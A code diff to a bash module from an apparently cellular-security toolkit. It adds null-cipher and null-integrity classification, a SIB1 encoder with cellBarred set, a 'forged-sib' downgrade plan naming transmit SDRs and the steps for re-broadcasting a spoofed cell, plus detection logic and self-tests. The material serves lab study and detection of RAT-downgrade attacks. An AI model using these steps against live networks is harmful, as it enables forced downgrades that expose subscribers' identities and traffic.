@@ -229,7 +229,45 @@ dwn_null_for_rat() {
 dwn_is_null_alg() {
     local alg="${1:-}"
     case "${alg^^}" in
-        NEA0|EIA0|EEA0|UIA0|UEA0|A5/0|A50|NULL|NONE) return 0 ;;
+        NEA0|NIA0|EIA0|EEA0|UIA0|UEA0|A5/0|A50|NULL|NONE) return 0 ;;
+        *) return 1 ;;
+    esac
+}
+
+# The assigned algorithm identifiers, per generation, as PUBLISHED.
+# Ciphering and integrity are separate 4-bit fields and either may be null
+# while the other is not — that asymmetry is the whole point of this module.
+#
+#   TS 33.501 §5.11.1.1  NR: NEA0..NEA3 = 0..3, NIA0..NIA3 = 0..3
+#   TS 33.401 §5.1.4     EPS: EEA0..EEA3 = 0..3, EIA0..EIA3 = 0..3
+#   TS 33.102 §6.6       UMTS: UEA0..UEA2 = 0..2, UIA0..UIA2 = 0..2
+#   TS 43.020 / 44.018   GSM: A5/0..A5/3 = 0..3, no integrity algorithm
+# The NR values (NEA0=0x00 .. NEA3=0x03, NIA0=0x00 .. NIA3=0x03) are
+# independently confirmed against the Go NAS library's security/parameters.go,
+# which cites TS 33.501 5.11.1.1 for exactly these constants.
+dwn_alg_id() {
+    local alg="${1:-}"
+    case "${alg^^}" in
+        NEA0|NIA0|EEA0|EIA0|UEA0|UIA0|A5/0|A50) echo 0 ;;
+        NEA1|NIA1|EEA1|EIA1|UEA1|UIA1|A5/1|A51) echo 1 ;;
+        NEA2|NIA2|EEA2|EIA2|UEA2|UIA2|A5/2|A52) echo 2 ;;
+        NEA3|NIA3|EEA3|EIA3|A5/3|A53)           echo 3 ;;
+        *) return 1 ;;
+    esac
+}
+
+# True when the name is a CIPHERING algorithm (not an integrity one).
+dwn_is_cipher_alg() {
+    case "${1^^}" in
+        NEA0|NEA1|NEA2|NEA3|EEA0|EEA1|EEA2|EEA3|UEA0|UEA1|UEA2|A5/0|A50|A5/1|A51|A5/2|A52|A5/3|A53) return 0 ;;
+        *) return 1 ;;
+    esac
+}
+
+# True when the name is an INTEGRITY algorithm.
+dwn_is_integrity_alg() {
+    case "${1^^}" in
+        NIA0|NIA1|NIA2|NIA3|EIA0|EIA1|EIA2|EIA3|UIA0|UIA1|UIA2) return 0 ;;
         *) return 1 ;;
     esac
 }
@@ -240,44 +278,217 @@ dwn_is_null_alg() {
 # algorithm (TS 24.501 §9.11.3.34 for 5GMM, TS 24.307 for EMM). The values
 # are the assigned algorithm identifiers, and 0 means null in every case.
 dwn_build_security_mode() {
-    local alg="${1:-}" rat="${2:-NR}"
-    [[ -n "$alg" ]] || { printf 'ERROR\tusage: --build-security-mode <alg> [NR|LTE|UMTS|GSM]\n' >&2; return 2; }
-    local a="${alg^^}"; a="${a//EEA/EEA}"; a="${a//NEA/NEA}"
-    local cipher_n integrity_n
-    case "$a" in
-        NEA0|NIA0) cipher_n=0; integrity_n=0 ;;
-        NEA1|NIA1) cipher_n=1; integrity_n=1 ;;
-        NEA2|NIA2) cipher_n=2; integrity_n=2 ;;
-        NEA3|NIA3) cipher_n=3; integrity_n=3 ;;
-        EEA0|EIA0) cipher_n=0; integrity_n=0 ;;
-        EEA1|EIA1) cipher_n=1; integrity_n=1 ;;
-        EEA2|EIA2) cipher_n=2; integrity_n=2 ;;
-        EEA3|EIA3) cipher_n=3; integrity_n=3 ;;
-        UEA0|UIA0) cipher_n=0; integrity_n=0 ;;
-        UEA1|UIA1) cipher_n=1; integrity_n=1 ;;
-        UEA2|UIA2) cipher_n=2; integrity_n=2 ;;
-        A5/0|A50)  cipher_n=0; integrity_n=0 ;;
-        A5/1|A51)  cipher_n=1; integrity_n=0 ;;
-        A5/2|A52)  cipher_n=2; integrity_n=0 ;;
-        A5/3|A53)  cipher_n=3; integrity_n=0 ;;
-        *) printf 'ERROR\tunknown algorithm: %s\n' "$(dwn_sanitize "$alg")" >&2; return 2 ;;
+    local alg="${1:-}" arg2="${2:-}" arg3="${3:-}"
+    local rat="NR" integrity=""
+    [[ -n "$alg" ]] || { printf 'ERROR\tusage: --build-security-mode <cipher-alg> [integrity-alg] [NR|LTE|UMTS|GSM]\n' >&2; return 2; }
+
+    # Two calling shapes share one signature and must both keep working:
+    #   --build-security-mode <alg> [RAT]                 (historical)
+    #   --build-security-mode <cipher> <integrity> [RAT]  (new)
+    # The second argument is a RAT name only when it is one; otherwise it is
+    # the integrity algorithm. Deciding by CONTENT, not by position, is what
+    # keeps the existing single-algorithm output byte-identical.
+    case "${arg2^^}" in
+        NR|LTE|UMTS|GSM) rat="${arg2^^}"; [[ -n "$arg3" ]] && rat="${arg3^^}" ;;
+        '')              : ;;
+        *)               integrity="${arg2^^}"; [[ -n "$arg3" ]] && rat="${arg3^^}" ;;
     esac
+    local a="${alg^^}"
+    local cipher_n integrity_n
+
+    # The single-algorithm form is unchanged: one name sets BOTH fields, and
+    # an integrity name given alone implies the matching cipher (this is the
+    # historical behaviour and the existing assertions depend on it).
+    if [[ -z "$integrity" ]]; then
+        case "$a" in
+            NEA0|NIA0) cipher_n=0; integrity_n=0 ;;
+            NEA1|NIA1) cipher_n=1; integrity_n=1 ;;
+            NEA2|NIA2) cipher_n=2; integrity_n=2 ;;
+            NEA3|NIA3) cipher_n=3; integrity_n=3 ;;
+            EEA0|EIA0) cipher_n=0; integrity_n=0 ;;
+            EEA1|EIA1) cipher_n=1; integrity_n=1 ;;
+            EEA2|EIA2) cipher_n=2; integrity_n=2 ;;
+            EEA3|EIA3) cipher_n=3; integrity_n=3 ;;
+            UEA0|UIA0) cipher_n=0; integrity_n=0 ;;
+            UEA1|UIA1) cipher_n=1; integrity_n=1 ;;
+            UEA2|UIA2) cipher_n=2; integrity_n=2 ;;
+            A5/0|A50)  cipher_n=0; integrity_n=0 ;;
+            A5/1|A51)  cipher_n=1; integrity_n=0 ;;
+            A5/2|A52)  cipher_n=2; integrity_n=0 ;;
+            A5/3|A53)  cipher_n=3; integrity_n=0 ;;
+            *) printf 'ERROR\tunknown algorithm: %s\n' "$(dwn_sanitize "$alg")" >&2; return 2 ;;
+        esac
+        integrity="$a"
+    else
+        # Two-argument form: cipher and integrity are named independently, so
+        # the realistic downgrade (strong ciphering, null integrity) is
+        # representable at all.
+        local i="${integrity^^}"
+        dwn_is_cipher_alg "$a" || {
+            printf 'ERROR\tfirst argument must be a ciphering algorithm, got: %s\n' \
+                "$(dwn_sanitize "$alg")" >&2; return 2; }
+        dwn_is_integrity_alg "$i" || {
+            printf 'ERROR\tsecond argument must be an integrity algorithm, got: %s\n' \
+                "$(dwn_sanitize "$integrity")" >&2; return 2; }
+        cipher_n=$(dwn_alg_id "$a")       || { printf 'ERROR\tunknown algorithm: %s\n' "$(dwn_sanitize "$alg")" >&2; return 2; }
+        integrity_n=$(dwn_alg_id "$i")    || { printf 'ERROR\tunknown algorithm: %s\n' "$(dwn_sanitize "$integrity")" >&2; return 2; }
+        integrity="$i"
+    fi
+
     local octet=$(( (cipher_n << 4) | integrity_n ))
     printf 'rat\t%s\n'            "$rat"
     printf 'algorithm\t%s\n'      "$a"
+    printf 'integrity_algorithm\t%s\n' "$integrity"
     printf 'cipher_id\t%s\n'      "$cipher_n"
     printf 'integrity_id\t%s\n'   "$integrity_n"
-    printf 'smc_octet\t%02X\n'    "$octet"
+    printf 'smc_octet\t%02X\n'    "$(( octet & 0xFF ))"
     printf 'smc_bits\t%s\n'       "$(printf '%08d' "$(echo "obase=2;$octet" | bc)")"
+    # Null-ciphering and null-integrity are decided SEPARATELY. Reporting a
+    # single "null_algorithm" flag would hide the module's own subject matter:
+    # NEA2 with NIA0 is a strong cipher with no integrity, not a null session.
+    local is_gsm=0
+    [[ "${rat^^}" == "GSM" ]] && is_gsm=1
     if dwn_is_null_alg "$a"; then
+        printf 'cipher_null\tyes\n'
+    else
+        printf 'cipher_null\tno\n'
+    fi
+    if (( is_gsm )); then
+        printf 'integrity_null\tn/a\n'
+    elif dwn_is_null_alg "$integrity"; then
+        printf 'integrity_null\tyes\n'
+    else
+        printf 'integrity_null\tno\n'
+    fi
+    # GSM carries no integrity algorithm, so the null question there is
+    # entirely about the cipher. Everywhere else BOTH must be null for the
+    # session to be a true null session.
+    if dwn_is_null_alg "$a" && { (( is_gsm )) || dwn_is_null_alg "$integrity"; }; then
         printf 'null_algorithm\tyes\n'
-        printf 'exposure\tno confidentiality and no integrity: the session is readable and forgeable\n'
+        if (( is_gsm )); then
+            printf 'exposure\tno ciphering: the IMSI and all traffic are in the clear\n'
+        else
+            printf 'exposure\tno confidentiality and no integrity: the session is readable and forgeable\n'
+        fi
     else
         printf 'null_algorithm\tno\n'
+        if dwn_is_null_alg "$a" || { (( ! is_gsm )) && dwn_is_null_alg "$integrity"; }; then
+            printf 'exposure\tpartial: %s\n' "$(dwn_null_exposure "$a" "$integrity" "${rat^^}")"
+        fi
+    fi
+    # A ciphering algorithm with no integrity algorithm beside it is the
+    # signature of a steered session, so name it where it happens.
+    if ! dwn_is_null_alg "$a" && (( ! is_gsm )) && dwn_is_null_alg "$integrity"; then
+        printf 'downgrade_signature\tcipher!=integrity: strong ciphering with null integrity — signalling is forgeable while the traffic looks protected\n'
     fi
     # GSM has no integrity algorithm at all, which is the point.
-    if [[ "${rat^^}" == "GSM" ]]; then
+    if (( is_gsm )); then
         printf 'integrity_available\tno (GSM has no integrity protection on the air interface)\n'
+    fi
+}
+
+# ── SIB1 with cellBarred — the forged-SIB downgrade vector ──────────────
+#
+# The module header describes suppressing a higher-RAT cell with a forged SIB
+# carrying cellBarred. The *encoding* half of that is pure computation and is
+# done here for real; the transmit half is the `forged-sib` plan.
+#
+# Layout is the tree's own SIB1 body convention, which is what
+# `14_lte_air.sh --decode-sib 1` parses:
+#
+#   PLMN        3 octets   TS 24.008 §10.5.1.3 BCD (MCC digit2|digit1,
+#                          MNC digit3|MCC digit3, MNC digit2|digit1)
+#   TAC         2 octets   tracking area code, 16 bits
+#   cellIdentity 28 bits   = 7 nibbles, TS 36.331 §6.2.2
+#                 = 17 nibbles total
+#
+# cellBarred and intraFreqReselection are appended as one further octet so a
+# built SIB1 round-trips through that reader with the flag set:
+#
+#   bit 7   cellBarred           1 = barred, 0 = notBarred
+#   bit 6   intraFreqReselection 1 = notAllowed, 0 = allowed
+#
+# This is NOT TS 36.331 APER. Real SIB1 is bit-packed and cellBarred sits
+# inside cellAccessRelatedInfo behind a CHOICE, so a bit-exact encoding needs
+# an APER codec this tree does not ship. What is real here is the field layout
+# and the values — which is what a lab needs in order to build the frame it
+# broadcasts with srsRAN or OpenAirInterface, and enough for the reader above
+# to confirm the flag survived. The distinction is stated in the output.
+dwn_encode_plmn() {
+    local mcc="${1:-}" mnc="${2:-}"
+    [[ "$mcc" =~ ^[0-9]{3}$ ]] || return 1
+    [[ "$mnc" =~ ^[0-9]{2,3}$ ]] || return 1
+    local m1="${mcc:0:1}" m2="${mcc:1:1}" m3="${mcc:2:1}"
+    local n1 n2 n3
+    if (( ${#mnc} == 3 )); then
+        n1="${mnc:0:1}"; n2="${mnc:1:1}"; n3="${mnc:2:1}"
+    else
+        n1="${mnc:0:1}"; n2="${mnc:1:1}"; n3="f"
+    fi
+    printf '%s%s%s%s%s%s' "$m2" "$m1" "$n3" "$m3" "$n2" "$n1"
+}
+
+dwn_build_sib1() {
+    local mcc="${1:-001}" mnc="${2:-01}" tac="${3:-1}" cellid="${4:-0}" barred="${5:-barred}"
+    local intra="${6:-notAllowed}"
+
+    local plmn
+    plmn=$(dwn_encode_plmn "$mcc" "$mnc") || {
+        printf 'ERROR\tbad PLMN: mcc=%s mnc=%s (want 3 and 2-3 digits)\n' \
+            "$(dwn_sanitize "$mcc")" "$(dwn_sanitize "$mnc")" >&2; return 1; }
+    [[ "$tac" =~ ^[0-9]+$ ]] && (( tac >= 0 && tac <= 65535 )) || {
+        printf 'ERROR\tTAC out of range: %s (want 0..65535)\n' "$(dwn_sanitize "$tac")" >&2; return 1; }
+    [[ "$cellid" =~ ^[0-9]+$ ]] && (( cellid >= 0 && cellid <= 268435455 )) || {
+        printf 'ERROR\tcellIdentity out of range: %s (want 0..2^28-1 = 268435455)\n' \
+            "$(dwn_sanitize "$cellid")" >&2; return 1; }
+
+    local barred_bit intra_bit
+    case "$barred" in
+        barred)    barred_bit=1 ;;
+        notBarred) barred_bit=0 ;;
+        *) printf 'ERROR\tbad cellBarred: %s (want barred|notBarred)\n' "$(dwn_sanitize "$barred")" >&2; return 1 ;;
+    esac
+    case "$intra" in
+        notAllowed) intra_bit=1 ;;
+        allowed)    intra_bit=0 ;;
+        *) printf 'ERROR\tbad intraFreqReselection: %s (want allowed|notAllowed)\n' "$(dwn_sanitize "$intra")" >&2; return 1 ;;
+    esac
+
+    local tac_hex cell_hex flags
+    tac_hex=$(printf '%04x' "$tac")
+    cell_hex=$(printf '%07x' "$cellid")
+    flags=$(printf '%02x' "$(( barred_bit * 128 + intra_bit * 64 ))")
+
+    local body="${plmn}${tac_hex}${cell_hex}"
+    printf 'message\tSIB1 (SystemInformationBlockType1)\n'
+    printf 'encoding\ttree nibble convention (see module notes) — NOT TS 36.331 APER\n'
+    printf 'plmn_octets\t%s\n' "$plmn"
+    printf 'mcc\t%s\n' "$mcc"
+    printf 'mnc\t%s\n' "$mnc"
+    printf 'tracking_area_code\t%s\n' "$tac"
+    printf 'tracking_area_code_hex\t%s\n' "$tac_hex"
+    printf 'cell_identity\t%s\n' "$cellid"
+    printf 'cell_identity_hex\t%s\n' "$cell_hex"
+    printf 'cell_barred\t%s\n' "$barred"
+    printf 'intra_freq_reselection\t%s\n' "$intra"
+    printf 'flags_octet\t%s\n' "$flags"
+    printf 'body\t%s\n' "$body"
+    printf 'body_with_flags\t%s%s\n' "$body" "$flags"
+    printf 'nibbles\t%s\n' "$(( ${#body} + ${#flags} ))"
+    printf 'decode_with\t14_lte_air.sh --decode-sib 1 <body>\n'
+}
+
+# One line describing what a given cipher/integrity pair leaves exposed.
+dwn_null_exposure() {
+    local cipher="${1:-}" integrity="${2:-}" rat="${3:-}"
+    if dwn_is_null_alg "$cipher" && dwn_is_null_alg "$integrity"; then
+        printf 'no confidentiality and no integrity: the session is readable and forgeable'
+    elif dwn_is_null_alg "$cipher"; then
+        printf 'null ciphering with %s integrity: the traffic is readable but not forgeable' "$integrity"
+    elif dwn_is_null_alg "$integrity"; then
+        printf '%s ciphering with null integrity: the traffic is confidential but every signalling message is forgeable' "$cipher"
+    else
+        printf '%s/%s: no null algorithm selected' "$cipher" "$integrity"
     fi
 }
 
@@ -316,7 +527,17 @@ dwn_path() {
             printf 'detect_by\t%s\n' "an S1 Release or handover to UTRAN/GERAN, followed by a Location Updating Request and an Identity Request (IMSI)"
             printf 'status\t%s\n' "handoff — needs the legacy RAN"
             ;;
-        *) printf 'ERROR\tunknown path: %s (want steer-down|jamming-suppress|cs-fallback)\n' \
+        forged-sib)
+            printf 'path\tforged-sib\n'
+            printf 'generation\t5G -> 4G (or 4G -> 3G/2G)\n'
+            printf 'mechanism\t%s\n' "broadcast a SIB1 for the target cell with cellBarred=barred so the UE treats the cell as unavailable and reselects the strongest remaining RAT"
+            printf 'ue_behaviour\t%s\n' "cellBarred is a normal broadcast field, so the UE reports no error — it simply considers the cell barred and performs cell reselection"
+            printf 'sib_fields\t%s\n' "cellAccessRelatedInfo.cellBarred (barred|notBarred) and intraFreqReselection (allowed|notAllowed), TS 36.331 6.2.2"
+            printf 'requires\t%s\n' "a transmit-capable SDR (HackRF, BladeRF, USRP or LimeSDR) and srsRAN or OpenAirInterface able to broadcast a modified SIB1"
+            printf 'detect_by\t%s\n' "a SIB1 whose cellBarred is barred while the cell is still transmitting normally, followed by a RAT change with no reject cause and no measurement-report gap"
+            printf 'status\t%s\n' "encoding half is real — $0 --build-sib1; broadcasting it is the forged-sib plan"
+            ;;
+        *) printf 'ERROR\tunknown path: %s (want steer-down|jamming-suppress|cs-fallback|forged-sib)\n' \
                "$(dwn_sanitize "$name")" >&2; return 2 ;;
     esac
 }
@@ -358,7 +579,14 @@ dwn_detect() {
         work="$MOD_TMP/detect.tsv"
         if ! tshark -r "$file" -T fields \
               -e frame.time_epoch -e _ws.col.Protocol -e _ws.col.Info 2>/dev/null \
-              | awk -F'\t' 'NF>=3 && $3!="" {printf "%s\t%s\tevent\t%s\n", $1, $2, $3}' > "$work"; then
+              | awk -F'\t' '
+                    NF>=3 && $3!="" {
+                        info=$3; i=tolower(info); ev="other"
+                        if (i ~ /reject/)                            ev="reject"
+                        else if (i ~ /rat_change|rat change|handover/) ev="rat_change"
+                        else if (i ~ /cipher/)                        ev="cipher_change"
+                        printf "%s\t%s\t%s\t%s\n", $1, $2, ev, info
+                    }' > "$work"; then
             printf 'ERROR\ttshark could not read %s\n' "$(dwn_sanitize "$file")" >&2
             return 1
         fi
@@ -460,7 +688,12 @@ dwn_plan() {
             need="A 2G or 3G radio access network reachable by the target UE (a lab femto, a test UTRAN/GERAN cell, or an operator network permitting roaming), plus a UE and a way to originate a CS call."
             steps="1. Confirm the target area has UTRAN/GERAN coverage the UE can select.\n2. Originate a mobile-originated CS call from the UE on the LTE/5G cell.\n3. Capture the S1/N2 release and the redirectedCarrierInfo pointing at UTRAN/GERAN.\n4. Capture the Location Updating Request on the legacy RAN.\n5. Look for an Identity Request with the IMSI identity type — that is the exposure.\n6. Record the cipher mode command and which A5/UEA algorithm was chosen."
             ;;
-        *) printf 'ERROR\tunknown plan: %s (want steer-down|jamming-suppress|cs-fallback)\n' \
+        forged-sib)
+            why="A UE trusts the SIB it receives. SIB1 carries cellBarred, and a UE that reads cellBarred=barred on the NR cell treats it as unavailable and reselects the strongest remaining RAT — which is the downgrade, performed without touching the core network. Unlike jamming this is a valid-looking broadcast, so the UE reports no error."
+            need="A transmit-capable SDR — HackRF, BladeRF, USRP (B200/B210) or LimeSDR — plus srsRAN or OpenAirInterface able to broadcast a modified SIB1, and lawful authority for the band. An rtl-sdr cannot transmit. The SIB1 body itself is built offline by $0 --build-sib1."
+            steps="1. Survey the target NR cell: SSB ARFCN and GSCN ($0 --path, 16_nr_air.sh --arfcn / --ssb).\n2. Build the substitute SIB1 with the real PLMN, TAC and cellIdentity of that cell, and cellBarred set: $0 --build-sib1 <mcc> <mnc> <tac> <cellid> barred notAllowed.\n3. Confirm the body decodes back to those fields: 14_lte_air.sh --decode-sib 1 <body>.\n4. Patch the SIB1 into the srsRAN/OAI broadcast configuration and re-broadcast on the same cell identity.\n5. Watch the UE: cellBarred makes it consider the NR cell unavailable, so look for the reselection to LTE (or to 2G/3G).\n6. Record the time from the modified broadcast to the reselection — the downshift window.\n7. Stop the broadcast and confirm the UE returns to NR."
+            ;;
+        *) printf 'ERROR\tunknown plan: %s (want steer-down|jamming-suppress|cs-fallback|forged-sib)\n' \
                "$(dwn_sanitize "$name")" >&2; return 2 ;;
     esac
     if ! cat > "$f" <<EOF
@@ -487,6 +720,7 @@ $(printf '%b' "  ${steps}" | sed 's/^/  /')
 offline_encoders:
   $0 --reject-cause <n>
   $0 --build-security-mode <alg>
+  $0 --build-sib1 <mcc> <mnc> <tac> <cellid> [barred|notBarred] [allowed|notAllowed]
   $0 --null-cipher-table
 
 references:
@@ -577,9 +811,9 @@ dwn_cmd_reject_cause() {
 dwn_cmd_null_table() { dwn_null_table; }
 
 dwn_cmd_build_smc() {
-    local alg="${1:-}" rat="${2:-NR}"
-    [[ -n "$alg" ]] || { printf 'ERROR\tusage: --build-security-mode <alg> [NR|LTE|UMTS|GSM]\n' >&2; return 2; }
-    dwn_build_security_mode "$alg" "$rat"
+    local alg="${1:-}" a2="${2:-}" a3="${3:-}"
+    [[ -n "$alg" ]] || { printf 'ERROR\tusage: --build-security-mode <cipher-alg> [integrity-alg] [NR|LTE|UMTS|GSM]\n' >&2; return 2; }
+    dwn_build_security_mode "$alg" "$a2" "$a3"
 }
 
 dwn_cmd_detect() { dwn_detect "${1:-}"; }
@@ -776,9 +1010,9 @@ EOF
     : > "$d/empty.tsv"
     chk detect-empty   "$(dwn_detect "$d/empty.tsv" >/dev/null 2>&1; echo $?)" "1"
 
-    # 6. The three paths each describe a real mechanism.
+    # 6. The four paths each describe a real mechanism.
     local p
-    for p in steer-down jamming-suppress cs-fallback; do
+    for p in steer-down jamming-suppress cs-fallback forged-sib; do
         out=$(dwn_path "$p")
         chk "path-$p-name"    "$(fld "$out" path)"   "$p"
         chk "path-$p-mech"    "$(printf '%s\n' "$out" | grep -c '^mechanism	')"  "1"
@@ -790,7 +1024,7 @@ EOF
     chk path-bad         "$(dwn_path nonsense >/dev/null 2>&1; echo $?)" "2"
 
     # 7. Plan files carry status: handoff and name the hardware.
-    for p in steer-down jamming-suppress cs-fallback; do
+    for p in steer-down jamming-suppress cs-fallback forged-sib; do
         out=$(dwn_plan "$p")
         chk "plan-$p-status"  "$(fld "$out" status)" "handoff"
         chk "plan-$p-file"    "$([[ -f "$DWN_PLAN_DIR/${p}.plan" ]] && echo yes || echo no)" "yes"
@@ -804,7 +1038,33 @@ EOF
     chk plan-bad  "$(dwn_plan nonsense >/dev/null 2>&1; echo $?)" "2"
     chk plan-none "$(dwn_plan '' >/dev/null 2>&1; echo $?)"       "2"
 
-    # 8. Verb validation returns non-zero and never prints a success line.
+    # 8. --build-sib1 encodes cellBarred. The body layout is the tree's own
+    #    SIB1 convention, sliced exactly as 14_lte_air --decode-sib 1 reads it:
+    #    PLMN 0:6 | TAC 6:2 + 8:2 | cellIdentity 10:7.
+    chk sib1-plmn-2digit "$(dwn_encode_plmn 234 15)"  "32f451"
+    chk sib1-plmn-3digit "$(dwn_encode_plmn 310 260)" "130062"
+    local sib sib_body
+    sib=$(dwn_build_sib1 234 15 4444 1234567 barred notAllowed)
+    chk sib1-body    "$(fld "$sib" body)"        "32f451115c012d687"
+    chk sib1-nibbles "$(fld "$sib" nibbles)"     "19"
+    chk sib1-flags   "$(fld "$sib" flags_octet)" "c0"
+    chk sib1-barred  "$(fld "$sib" cell_barred)" "barred"
+    chk sib1-intra   "$(fld "$sib" intra_freq_reselection)" "notAllowed"
+    sib_body=$(fld "$sib" body)
+    chk sib1-slice-plmn   "${sib_body:0:6}" "$(dwn_encode_plmn 234 15)"
+    chk sib1-slice-tac    "$(( 16#${sib_body:6:2} * 256 + 16#${sib_body:8:2} ))" "4444"
+    chk sib1-slice-cellid "$(( 16#${sib_body:10:7} ))" "1234567"
+    chk sib1-notbarred "$(fld "$(dwn_build_sib1 234 15 4444 1234567 notBarred allowed)" flags_octet)" "00"
+    # A built SIB1 must say it is not TS 36.331 APER rather than imply it is.
+    chk sib1-honest-encoding "$(printf '%s\n' "$sib" | grep -c 'NOT TS 36.331 APER')" "1"
+    # Bad input must fail, never guess.
+    chk sib1-bad-plmn   "$(dwn_build_sib1 12 15 >/dev/null 2>&1; echo $?)"          "1"
+    chk sib1-bad-tac    "$(dwn_build_sib1 234 15 70000 0 >/dev/null 2>&1; echo $?)" "1"
+    chk sib1-bad-cellid "$(dwn_build_sib1 234 15 1 268435456 >/dev/null 2>&1; echo $?)" "1"
+    chk sib1-bad-barred "$(dwn_build_sib1 234 15 1 0 maybe >/dev/null 2>&1; echo $?)"   "1"
+    chk sib1-bad-intra  "$(dwn_build_sib1 234 15 1 0 barred maybe >/dev/null 2>&1; echo $?)" "1"
+
+    # 9. Verb validation returns non-zero and never prints a success line.
     chk cli-cause-noargs  "$(dwn_cmd_reject_cause >/dev/null 2>&1; echo $?)" "2"
     chk cli-cause-bad     "$(dwn_cmd_reject_cause xyz >/dev/null 2>&1; echo $?)" "2"
     chk cli-cause-unassigned "$(dwn_cmd_reject_cause 251 >/dev/null 2>&1; echo $?)" "1"
@@ -812,9 +1072,13 @@ EOF
     chk cli-smc-bad       "$(dwn_cmd_build_smc NOPE >/dev/null 2>&1; echo $?)" "2"
     chk cli-detect-noargs "$(dwn_cmd_detect >/dev/null 2>&1; echo $?)" "2"
     chk cli-plan-bad      "$(dwn_cmd_plan nope >/dev/null 2>&1; echo $?)" "2"
+    chk cli-sib1-bad-plmn "$(dwn_cli_main --build-sib1 12 15 >/dev/null 2>&1; echo $?)" "1"
+    # The forged-sib plan must point at the real offline encoder, not stand alone.
+    chk plan-forged-sib-encoder   "$(grep -c 'build-sib1' "$DWN_PLAN_DIR/forged-sib.plan" | awk '{print ($1>=1)?"yes":"no"}')" "yes"
+    chk plan-forged-sib-cellbarred "$(grep -c 'cellBarred' "$DWN_PLAN_DIR/forged-sib.plan" | awk '{print ($1>=1)?"yes":"no"}')" "yes"
     chk cli-unknown       "$(dwn_cli_main --wat >/dev/null 2>&1; echo $?)" "2"
 
-    # 9. Status TSV contract: the tables are always present.
+    # 10. Status TSV contract: the tables are always present.
     out=$(dwn_cli_status_tsv)
     chk status-dir      "$(fld "$out" dir)"      "$DWN_DIR"
     chk status-plandir  "$(fld "$out" plan_dir)" "$DWN_PLAN_DIR"
@@ -822,11 +1086,30 @@ EOF
     chk status-nulls    "$(fld "$out" null_ciphers)" "15"
     chk status-keys     "$(printf '%s\n' "$out" | grep -c . | awk '{print ($1>=8)?"ok":"short"}')" "ok"
 
-    # 10. TSV injection: a tab in an untrusted string must not forge a row.
+    # 11. TSV injection: a tab in an untrusted string must not forge a row.
     local evil
     evil=$(dwn_sanitize $'NR\tfake\trow\nmore')
     chk sanitize-tabs "$(printf '%s' "$evil" | awk -F'\t' '{print NF}')" "1"
     chk sanitize-nl   "$(printf '%s' "$evil" | grep -c .)" "1"
+
+    # 12. pcap classification. A capture whose protocol info names a reject cause
+    #     must actually raise the steering-reject signal. Guards the awk that turns
+    #     tshark rows into records: it used to write a literal "event" into the
+    #     event column, so all three detectors -- which key on that column -- could
+    #     never fire and --detect answered CLEAN for every capture.
+    if command -v tshark >/dev/null 2>&1 && command -v text2pcap >/dev/null 2>&1; then
+        local hp="$d/reject.pcap"
+        printf '0000 47 45 54 20 2f 72 65 6a 65 63 74 3f 63 61 75 73\n0010 65 3d 31 35 20 48 54 54 50 2f 31 2e 31 0d 0a\n' > "$d/hex.txt"
+        if text2pcap -q -T 12345,80 "$d/hex.txt" "$hp" >/dev/null 2>&1; then
+            out=$(bash "$0" --detect "$hp" 2>/dev/null)
+            chk pcap-reject-raised "$(printf '%s\n' "$out" | awk -F'\t' '$1=="steering_rejects"{print $2}')" "1"
+            chk pcap-verdict       "$(printf '%s\n' "$out" | awk -F'\t' '$1=="verdict"{print $2}')" "SUSPECT"
+        else
+            chk pcap-reject-raised "text2pcap-failed" "ok-or-skipped"
+        fi
+    else
+        printf 'pcap-reject-raised\tSKIP (no tshark/text2pcap)\n'
+    fi
 
     rm -rf "$d"
     printf 'RESULT\t%s\n' "$([[ $bad -eq 0 ]] && echo PASS || echo "FAIL($bad)")"
@@ -894,6 +1177,7 @@ dwn_cli_main() {
         --reject-cause)      dwn_cmd_reject_cause "${1:-}" "${2:-}" ;;
         --null-cipher-table) dwn_cmd_null_table ;;
         --build-security-mode) dwn_cmd_build_smc "${1:-}" "${2:-NR}" ;;
+        --build-sib1)        dwn_build_sib1 "${1:-001}" "${2:-01}" "${3:-1}" "${4:-0}" "${5:-barred}" "${6:-notAllowed}" ;;
         --detect)            dwn_cmd_detect "${1:-}" ;;
         --path)              dwn_cmd_path "${1:-}" ;;
         --plan)              dwn_cmd_plan "${1:-}" ;;
@@ -911,10 +1195,14 @@ Usage: $0 COMMAND
   --null-cipher-table             NEA0/EEA0/UEA0/A5-0 across all generations
   --build-security-mode <alg> [RAT]
                                   the Security Mode Command algorithm octet
+  --build-sib1 <mcc> <mnc> <tac> <cellid> [barred|notBarred] [allowed|notAllowed]
+                                  a SIB1 body with cellBarred and
+                                  intraFreqReselection set — the forged-SIB
+                                  suppress-a-RAT vector, encoding half
   --detect <pcap|records.tsv>     find a downgrade: steering reject, RAT
                                   change, or a cipher change to null
   --path <name>                   describe a downgrade mechanism
-                                  (steer-down|jamming-suppress|cs-fallback)
+                                  (steer-down|jamming-suppress|cs-fallback|forged-sib)
   --causes                        the full assigned cause table
   --plan <name>                   write a handoff plan naming the hardware
   --selftest                      verify the tables and encoders without a radio
